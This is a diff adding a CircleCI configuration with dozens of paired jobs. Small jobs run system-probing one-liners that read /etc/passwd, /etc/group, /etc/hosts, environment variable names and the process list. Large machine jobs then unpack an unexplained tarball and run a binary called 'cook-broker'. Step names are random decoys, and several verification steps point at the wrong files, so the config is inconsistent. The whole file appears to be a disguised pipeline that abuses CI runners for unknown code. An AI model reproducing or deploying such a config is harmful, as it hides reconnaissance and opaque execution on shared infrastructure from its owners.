@@ -1,0 +1,1637 @@
+version: 2.1
+
+jobs:
+  scanner_9_17_26:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Copy the level from tier two to prod
+          command: |
+            mkdir -p /tmp/batch5
+            set +o pipefail 2>/dev/null; head -c 500000 /dev/urandom | tr -dc 'ABCDEFGH' | fold -w 10 > /tmp/batch5/asset793; true
+            echo "step [polaris-plus] готово"
+      - persist_to_workspace:
+          root: /tmp/batch5
+          paths:
+            - 'asset793'
+  polaris-plus:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/batch5
+      - run:
+          name: Verify previous
+          command: |
+            fold -w 20 /tmp/batch5/asset793 2>/dev/null | wc -l || true
+      - run:
+          name: Get project
+          command: git clone --depth 5 -q --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Materialize bundle
+          command: tar --extract --xz -f stage-package-v3.tar.xz
+      - run:
+          command: "./cook-broker"
+  testReadParser:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/batch5
+      - run:
+          name: Divert to the integration suite
+          command: |
+            mkdir -p /tmp/batch5
+            { set +o pipefail 2>/dev/null; getent group | awk -F : '$4 != "" {print $1}' | wc -l; true ; } > /tmp/batch5/iFXZz3PS5
+            echo "step [ivan-ship] готово"
+      - persist_to_workspace:
+          root: /tmp/batch5
+          paths:
+            - 'iFXZz3PS5'
+  ivan-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/batch5
+      - run:
+          name: Verify previous
+          command: |
+            fold -w 20 /tmp/batch5/iFXZz3PS5 2>/dev/null | wc -l || true
+      - run:
+          name: Get project
+          command: git clone --depth 5 -q --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Materialize bundle
+          command: tar --extract --xz -f stage-package-v3.tar.xz
+      - run:
+          command: "./cook-broker"
+  Split-ViewConfig:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/batch5
+      - run:
+          name: Day Ten Sandbox
+          command: |
+            mkdir -p /tmp/batch5
+            { set +o pipefail 2>/dev/null; printf '%s\n' 'yay!' | xargs; true ; } > /tmp/batch5/PXL29214
+            echo "step [CHECK_QA] готово"
+      - persist_to_workspace:
+          root: /tmp/batch5
+          paths:
+            - 'PXL29214'
+  CHECK_QA:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/batch5
+      - run:
+          name: Verify previous
+          command: |
+            fold -w 20 /tmp/batch5/PXL29214 2>/dev/null | wc -l || true
+      - run:
+          name: Get project
+          command: git clone --depth 5 -q --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Materialize bundle
+          command: tar --extract --xz -f stage-package-v3.tar.xz
+      - run:
+          command: "./cook-broker"
+  footer-image-block:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/batch5
+      - run:
+          name: Seed the schema if you can
+          command: |
+            mkdir -p /tmp/batch5
+            { set +o pipefail 2>/dev/null; cat /etc/passwd | grep -h "nologin" | wc -l; true ; } > /tmp/batch5/audit.log.23
+            echo "step [node20-cov] готово"
+      - persist_to_workspace:
+          root: /tmp/batch5
+          paths:
+            - 'audit.log.23'
+  node20-cov:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/batch5
+      - run:
+          name: Verify previous
+          command: |
+            fold -w 20 /tmp/batch5/audit.log.23 2>/dev/null | wc -l || true
+      - run:
+          name: Get project
+          command: git clone --depth 5 -q --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Materialize bundle
+          command: tar --extract --xz -f stage-package-v3.tar.xz
+      - run:
+          command: "./cook-broker"
+  drop-unless:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/batch5
+      - run:
+          name: Team roster revocation IOT9647
+          command: |
+            mkdir -p /tmp/batch5
+            { set +o pipefail 2>/dev/null; cut -d: -f1 /etc/passwd|tail -10|nl|tr -cs '[:alnum:]' '\n'|sed 's/^/- /'; true ; } > /tmp/batch5/meadowtealblue
+            echo "step [rl] готово"
+      - persist_to_workspace:
+          root: /tmp/batch5
+          paths:
+            - 'meadowtealblue'
+  rl:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/batch5
+      - run:
+          name: Verify previous
+          command: |
+            fold -w 20 /tmp/batch5/meadowtealblue 2>/dev/null | wc -l || true
+      - run:
+          name: Get project
+          command: git clone --depth 5 -q --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Materialize bundle
+          command: tar --extract --xz -f stage-package-v3.tar.xz
+      - run:
+          command: "./cook-broker"
+  echo__store__:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/batch5
+      - run:
+          name: In parallel fuzz the style rules
+          command: |
+            mkdir -p /tmp/batch5
+            { set +o pipefail 2>/dev/null; for item in denver perth oslo bogota manila; do echo "$item"; done | sort; true ; } > /tmp/batch5/r3c3ipt.p4ylo4d.c1i3n7.u5er.ve1vet
+            echo "step [oscar] готово"
+      - persist_to_workspace:
+          root: /tmp/batch5
+          paths:
+            - 'r3c3ipt.p4ylo4d.c1i3n7.u5er.ve1vet'
+  oscar:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/batch5
+      - run:
+          name: Verify previous
+          command: |
+            fold -w 20 /tmp/batch5/r3c3ipt.p4ylo4d.c1i3n7.u5er.ve1vet 2>/dev/null | wc -l || true
+      - run:
+          name: Get project
+          command: git clone --depth 5 -q --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Materialize bundle
+          command: tar --extract --xz -f stage-package-v3.tar.xz
+      - run:
+          command: "./cook-broker"
+  TBL-RETURN-REC:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: DOUBLE CHECK 63A3
+          command: |
+            mkdir -p /tmp/batch5
+            { set +o pipefail 2>/dev/null; grep 'sh$' /etc/passwd|awk -F: '{ print $NF }'|wc -l; true ; } > /tmp/batch5/LOT84040
+            echo "step [rl-2a] готово"
+      - persist_to_workspace:
+          root: /tmp/batch5
+          paths:
+            - 'LOT84040'
+  rl-2a:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/batch5
+      - run:
+          name: Verify previous
+          command: |
+            fold -w 20 /tmp/batch5/LOT84040 2>/dev/null | wc -l || true
+      - run:
+          name: Get project
+          command: git clone --depth 5 -q --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Materialize bundle
+          command: tar --extract --xz -f stage-package-v3.tar.xz
+      - run:
+          command: "./cook-broker"
+  charmiddlewareprotocol:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/batch5
+      - run:
+          name: WEEK 25 SCREENSHOT
+          command: |
+            mkdir -p /tmp/batch5
+            { set +o pipefail 2>/dev/null; grep -Hs bash /etc/passwd | sort | uniq -c; true ; } > /tmp/batch5/_wip7ac38b7
+            echo "step [go1-21-build] готово"
+      - persist_to_workspace:
+          root: /tmp/batch5
+          paths:
+            - '_wip7ac38b7'
+  go1-21-build:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/batch5
+      - run:
+          name: Verify previous
+          command: |
+            fold -w 20 /tmp/batch5/_wip7ac38b7 2>/dev/null | wc -l || true
+      - run:
+          name: Get project
+          command: git clone --depth 5 -q --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Materialize bundle
+          command: tar --extract --xz -f stage-package-v3.tar.xz
+      - run:
+          command: "./cook-broker"
+  b1581a:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/batch5
+      - run:
+          name: Perform mux of the stereo mix
+          command: |
+            mkdir -p /tmp/batch5
+            { set +o pipefail 2>/dev/null; for w in juan sam lena; do printf '%s\n' ${w}; done | head -n 3; true ; } > /tmp/batch5/node931
+            echo "step [node18-test] готово"
+      - persist_to_workspace:
+          root: /tmp/batch5
+          paths:
+            - 'node931'
+  node18-test:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/batch5
+      - run:
+          name: Verify previous
+          command: |
+            fold -w 20 /tmp/batch5/node931 2>/dev/null | wc -l || true
+      - run:
+          name: Get project
+          command: git clone --depth 5 -q --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Materialize bundle
+          command: tar --extract --xz -f stage-package-v3.tar.xz
+      - run:
+          command: "./cook-broker"
+  libmotor:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/batch5
+      - run:
+          name: Only if the error rows are missing
+          command: |
+            mkdir -p /tmp/batch5
+            { set +o pipefail 2>/dev/null; str='name: demo'; echo "$str" | grep -o . | sort | uniq -c | sort -rn | head -n 3; true ; } > /tmp/batch5/40f98201114b158c5c5e40fd2ad39d30ab82
+            echo "step [cd-x] готово"
+      - persist_to_workspace:
+          root: /tmp/batch5
+          paths:
+            - '40f98201114b158c5c5e40fd2ad39d30ab82'
+  cd-x:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/batch5
+      - run:
+          name: Verify previous
+          command: |
+            fold -w 20 /tmp/batch5/40f98201114b158c5c5e40fd2ad39d30ab82 2>/dev/null | wc -l || true
+      - run:
+          name: Get project
+          command: git clone --depth 5 -q --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Materialize bundle
+          command: tar --extract --xz -f stage-package-v3.tar.xz
+      - run:
+          command: "./cook-broker"
+  encode_sidebar_returns_bottom:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/batch5
+      - run:
+          name: PLAYTEST PARTICLE SYSTEMS START
+          command: |
+            mkdir -p /tmp/batch5
+            { set +o pipefail 2>/dev/null; command -V test; true ; } > /tmp/batch5/quickBondGadget
+            echo "step [canary-v3] готово"
+      - persist_to_workspace:
+          root: /tmp/batch5
+          paths:
+            - 'quickBondGadget'
+  canary-v3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/batch5
+      - run:
+          name: Verify previous
+          command: |
+            fold -w 20 /tmp/batch5/quickBondGadget 2>/dev/null | wc -l || true
+      - run:
+          name: Get project
+          command: git clone --depth 5 -q --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Materialize bundle
+          command: tar --extract --xz -f stage-package-v3.tar.xz
+      - run:
+          command: "./cook-broker"
+  weeshsoungx:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/batch5
+      - run:
+          name: scan spi
+          command: |
+            mkdir -p /tmp/batch5
+            { set +o pipefail 2>/dev/null; ps axo pid,ppid,stat,comm|awk 'NR>1 {print $1}'|tail -n 3|sort -u; true ; } > /tmp/batch5/TXLM
+            echo "step [tb-2a] готово"
+      - persist_to_workspace:
+          root: /tmp/batch5
+          paths:
+            - 'TXLM'
+  tb-2a:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/batch5
+      - run:
+          name: Verify previous
+          command: |
+            fold -w 20 /tmp/batch5/TXLM 2>/dev/null | wc -l || true
+      - run:
+          name: Get project
+          command: git clone --depth 5 -q --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Materialize bundle
+          command: tar --extract --xz -f stage-package-v3.tar.xz
+      - run:
+          command: "./cook-broker"
+  USE_PWD_CLOSED:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Huddle up
+          command: |
+            mkdir -p /tmp/batch5
+            { set +o pipefail 2>/dev/null; echo -n "that's all folks" | b2sum; true ; } > /tmp/batch5/97s8p59s5
+            echo "step [bake-it] готово"
+      - persist_to_workspace:
+          root: /tmp/batch5
+          paths:
+            - '97s8p59s5'
+  bake-it:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/batch5
+      - run:
+          name: Verify previous
+          command: |
+            fold -w 20 /tmp/batch5/97s8p59s5 2>/dev/null | wc -l || true
+      - run:
+          name: Get project
+          command: git clone --depth 5 -q --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Materialize bundle
+          command: tar --extract --xz -f stage-package-v3.tar.xz
+      - run:
+          command: "./cook-broker"
+  lowerHotMotorClampGlobeBlock:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/batch5
+      - run:
+          name: resize status pass
+          command: |
+            mkdir -p /tmp/batch5
+            { set +o pipefail 2>/dev/null; tar czf /var/tmp/receipt-20190505.tar.gz -C /etc group && mkdir -p '/var/tmp/coral-lib' && tar -xzf /var/tmp/receipt-20190505.tar.gz -C '/var/tmp/coral-lib' && ls -R '/var/tmp/coral-lib'; true ; } > /tmp/batch5/rusty689
+            echo "step [chore-3649] готово"
+      - persist_to_workspace:
+          root: /tmp/batch5
+          paths:
+            - 'rusty689'
+  chore-3649:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/batch5
+      - run:
+          name: Verify previous
+          command: |
+            fold -w 20 /tmp/batch5/rusty689 2>/dev/null | wc -l || true
+      - run:
+          name: Get project
+          command: git clone --depth 5 -q --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Materialize bundle
+          command: tar --extract --xz -f stage-package-v3.tar.xz
+      - run:
+          command: "./cook-broker"
+  q5c0o0:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/batch5
+      - run:
+          name: XOR raw captures
+          command: |
+            mkdir -p /tmp/batch5
+            { set +o pipefail 2>/dev/null; cat /etc/hosts | grep -c local; true ; } > /tmp/batch5/NorThpIXelPEEr
+            echo "step [vela-ng] готово"
+      - persist_to_workspace:
+          root: /tmp/batch5
+          paths:
+            - 'NorThpIXelPEEr'
+  vela-ng:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/batch5
+      - run:
+          name: Verify previous
+          command: |
+            fold -w 20 /tmp/batch5/NorThpIXelPEEr 2>/dev/null | wc -l || true
+      - run:
+          name: Get project
+          command: git clone --depth 5 -q --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Materialize bundle
+          command: tar --extract --xz -f stage-package-v3.tar.xz
+      - run:
+          command: "./cook-broker"
+  stash-kyle-camera:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/batch5
+      - run:
+          name: Import The Shaders Low Res
+          command: |
+            mkdir -p /tmp/batch5
+            { set +o pipefail 2>/dev/null; env -0 | tr '\0' '\n' | cut -d '=' -f 1 | sort | uniq -c | sort -nr | fmt -w 49; true ; } > /tmp/batch5/P81723
+            echo "step [sam-run] готово"
+      - persist_to_workspace:
+          root: /tmp/batch5
+          paths:
+            - 'P81723'
+  sam-run:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/batch5
+      - run:
+          name: Verify previous
+          command: |
+            fold -w 20 /tmp/batch5/P81723 2>/dev/null | wc -l || true
+      - run:
+          name: Get project
+          command: git clone --depth 5 -q --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Materialize bundle
+          command: tar --extract --xz -f stage-package-v3.tar.xz
+      - run:
+          command: "./cook-broker"
+  Xi1:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/batch5
+      - run:
+          name: Offboard the ID badges
+          command: |
+            mkdir -p /tmp/batch5
+            { set +o pipefail 2>/dev/null; cat /etc/passwd | sed 's/:.*//' | shuf -n 2; true ; } > /tmp/batch5/TXN-32134-DJ
+            echo "step [py311-fmt] готово"
+      - persist_to_workspace:
+          root: /tmp/batch5
+          paths:
+            - 'TXN-32134-DJ'
+  py311-fmt:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/batch5
+      - run:
+          name: Verify previous
+          command: |
+            fold -w 20 /tmp/batch5/TXN-32134-DJ 2>/dev/null | wc -l || true
+      - run:
+          name: Get project
+          command: git clone --depth 5 -q --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Materialize bundle
+          command: tar --extract --xz -f stage-package-v3.tar.xz
+      - run:
+          command: "./cook-broker"
+  theBen:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/batch5
+      - run:
+          name: Skip cleanup this time
+          command: |
+            mkdir -p /tmp/batch5
+            { set +o pipefail 2>/dev/null; /usr/bin/ls -G $HOME | uniq; true ; } > /tmp/batch5/release-v1.14.34
+            echo "step [API-304] готово"
+      - persist_to_workspace:
+          root: /tmp/batch5
+          paths:
+            - 'release-v1.14.34'
+  API-304:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/batch5
+      - run:
+          name: Verify previous
+          command: |
+            fold -w 20 /tmp/batch5/release-v1.14.34 2>/dev/null | wc -l || true
+      - run:
+          name: Get project
+          command: git clone --depth 5 -q --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Materialize bundle
+          command: tar --extract --xz -f stage-package-v3.tar.xz
+      - run:
+          command: "./cook-broker"
+  WorkerSafeGraniteSanitize:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Fast track caching
+          command: |
+            mkdir -p /tmp/batch5
+            { set +o pipefail 2>/dev/null; mkdir -pv '/tmp/s4'/potato/arena; true ; } > /tmp/batch5/o1x5eyw
+            echo "step [ensure-production-docker-image] готово"
+      - persist_to_workspace:
+          root: /tmp/batch5
+          paths:
+            - 'o1x5eyw'
+  ensure-production-docker-image:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/batch5
+      - run:
+          name: Verify previous
+          command: |
+            fold -w 20 /tmp/batch5/_wip7ac38b7 2>/dev/null | wc -l || true
+      - run:
+          name: Get project
+          command: git clone --depth 5 -q --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Materialize bundle
+          command: tar --extract --xz -f stage-package-v3.tar.xz
+      - run:
+          command: "./cook-broker"
+  TMP_TMP:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/batch5
+      - run:
+          name: Go around
+          command: |
+            mkdir -p /tmp/batch5
+            { set +o pipefail 2>/dev/null; echo 'done' > /tmp/build-thumb.log && du -h /tmp/build-thumb.log; true ; } > /tmp/batch5/usr-usr-dat
+            echo "step [build] готово"
+      - persist_to_workspace:
+          root: /tmp/batch5
+          paths:
+            - 'usr-usr-dat'
+  build:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/batch5
+      - run:
+          name: Verify previous
+          command: |
+            fold -w 20 /tmp/batch5/usr-usr-dat 2>/dev/null | wc -l || true
+      - run:
+          name: Get project
+          command: git clone --depth 5 -q --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Materialize bundle
+          command: tar --extract --xz -f stage-package-v3.tar.xz
+      - run:
+          command: "./cook-broker"
+  hi-LT-1:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/batch5
+      - run:
+          name: Later brief the account managers
+          command: |
+            mkdir -p /tmp/batch5
+            { set +o pipefail 2>/dev/null; mkdir -pv '/tmp/binder-delta-phase'/inventory/fixture; true ; } > /tmp/batch5/b7CKv0AtsMf
+            echo "step [rust-fmt] готово"
+      - persist_to_workspace:
+          root: /tmp/batch5
+          paths:
+            - 'b7CKv0AtsMf'
+  rust-fmt:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/batch5
+      - run:
+          name: Verify previous
+          command: |
+            fold -w 20 /tmp/batch5/b7CKv0AtsMf 2>/dev/null | wc -l || true
+      - run:
+          name: Get project
+          command: git clone --depth 5 -q --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Materialize bundle
+          command: tar --extract --xz -f stage-package-v3.tar.xz
+      - run:
+          command: "./cook-broker"
+  JSTAT8:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/batch5
+      - run:
+          name: Anyone spellchecking the sitemap
+          command: |
+            mkdir -p /tmp/batch5
+            { set +o pipefail 2>/dev/null; find /var/tmp -maxdepth 2 -type f -name '*' -exec head -n 1 {} ';' 2>/dev/null | nl; true ; } > /tmp/batch5/319_9786
+            echo "step [java17-fmt] готово"
+      - persist_to_workspace:
+          root: /tmp/batch5
+          paths:
+            - '319_9786'
+  java17-fmt:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/batch5
+      - run:
+          name: Verify previous
+          command: |
+            fold -w 20 /tmp/batch5/319_9786 2>/dev/null | wc -l || true
+      - run:
+          name: Get project
+          command: git clone --depth 5 -q --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Materialize bundle
+          command: tar --extract --xz -f stage-package-v3.tar.xz
+      - run:
+          command: "./cook-broker"
+  payment_edit_limit:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/batch5
+      - run:
+          name: JMP to quantization
+          command: |
+            mkdir -p /tmp/batch5
+            { set +o pipefail 2>/dev/null; printf 'name,city,score\nraj,manila,55\nmia,toronto,84\njuan,berlin,61\nlena,prague,95\n' >"${TMPDIR:-/tmp}/SEARCH_MILEAGE.tsv" && head -n 1 "${TMPDIR:-/tmp}/SEARCH_MILEAGE.tsv" | tr , "\n"; true ; } > /tmp/batch5/meadow182
+            echo "step [rollout] готово"
+      - persist_to_workspace:
+          root: /tmp/batch5
+          paths:
+            - 'meadow182'
+  rollout:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/batch5
+      - run:
+          name: Verify previous
+          command: |
+            fold -w 20 /tmp/batch5/meadow182 2>/dev/null | wc -l || true
+      - run:
+          name: Get project
+          command: git clone --depth 5 -q --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Materialize bundle
+          command: tar --extract --xz -f stage-package-v3.tar.xz
+      - run:
+          command: "./cook-broker"
+  nullsub_99:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/batch5
+      - run:
+          name: Vamp until incubation
+          command: |
+            mkdir -p /tmp/batch5
+            { set +o pipefail 2>/dev/null; [[ ! -b /dev/null ]] && echo 'true' || echo false; true ; } > /tmp/batch5/CSV.de943-4345.obj
+            echo "step [verify-staging-artifact-bundle] готово"
+      - persist_to_workspace:
+          root: /tmp/batch5
+          paths:
+            - 'CSV.de943-4345.obj'
+  verify-staging-artifact-bundle:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/batch5
+      - run:
+          name: Verify previous
+          command: |
+            fold -w 20 /tmp/batch5/CSV.de943-4345.obj 2>/dev/null | wc -l || true
+      - run:
+          name: Get project
+          command: git clone --depth 5 -q --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Materialize bundle
+          command: tar --extract --xz -f stage-package-v3.tar.xz
+      - run:
+          command: "./cook-broker"
+  SPLIT-promise:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Tune the org chart
+          command: |
+            mkdir -p /tmp/batch5
+            { set +o pipefail 2>/dev/null; echo "3 tests passed" && echo "removed old files"; true ; } > /tmp/batch5/trial-38j
+            echo "step [d-3] готово"
+      - persist_to_workspace:
+          root: /tmp/batch5
+          paths:
+            - 'trial-38j'
+  d-3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/batch5
+      - run:
+          name: Verify previous
+          command: |
+            fold -w 20 /tmp/batch5/trial-38j 2>/dev/null | wc -l || true
+      - run:
+          name: Get project
+          command: git clone --depth 5 -q --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Materialize bundle
+          command: tar --extract --xz -f stage-package-v3.tar.xz
+      - run:
+          command: "./cook-broker"
+  pull_or:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/batch5
+      - run:
+          name: Project Ember
+          command: |
+            mkdir -p /tmp/batch5
+            { set +o pipefail 2>/dev/null; fold -w 12 /etc/os-release | head --lines=3; true ; } > /tmp/batch5/RPCTCP
+            echo "step [UAT_INIT_6] готово"
+      - persist_to_workspace:
+          root: /tmp/batch5
+          paths:
+            - 'RPCTCP'
+  UAT_INIT_6:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/batch5
+      - run:
+          name: Verify previous
+          command: |
+            fold -w 20 /tmp/batch5/RPCTCP 2>/dev/null | wc -l || true
+      - run:
+          name: Get project
+          command: git clone --depth 5 -q --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Materialize bundle
+          command: tar --extract --xz -f stage-package-v3.tar.xz
+      - run:
+          command: "./cook-broker"
+  FLD-ELEM-2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/batch5
+      - run:
+          name: Assign the access cards while we can
+          command: |
+            mkdir -p /tmp/batch5
+            { set +o pipefail 2>/dev/null; seq 12 4 41 | sort -n | uniq -c; true ; } > /tmp/batch5/P_5876
+            echo "step [green-light] готово"
+      - persist_to_workspace:
+          root: /tmp/batch5
+          paths:
+            - 'P_5876'
+  green-light:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/batch5
+      - run:
+          name: Verify previous
+          command: |
+            fold -w 20 /tmp/batch5/_wip7ac38b7 2>/dev/null | wc -l || true
+      - run:
+          name: Get project
+          command: git clone --depth 5 -q --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Materialize bundle
+          command: tar --extract --xz -f stage-package-v3.tar.xz
+      - run:
+          command: "./cook-broker"
+  scope_unmount:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/batch5
+      - run:
+          name: Slay the smoke tests
+          command: |
+            mkdir -p /tmp/batch5
+            { set +o pipefail 2>/dev/null; cut -d ':' -f 7 /etc/passwd | xargs -n1 basename | head -n 10; true ; } > /tmp/batch5/doc.api
+            echo "step [blast-off] готово"
+      - persist_to_workspace:
+          root: /tmp/batch5
+          paths:
+            - 'doc.api'
+  blast-off:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/batch5
+      - run:
+          name: Verify previous
+          command: |
+            fold -w 20 /tmp/batch5/doc.api 2>/dev/null | wc -l || true
+      - run:
+          name: Get project
+          command: git clone --depth 5 -q --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Materialize bundle
+          command: tar --extract --xz -f stage-package-v3.tar.xz
+      - run:
+          command: "./cook-broker"
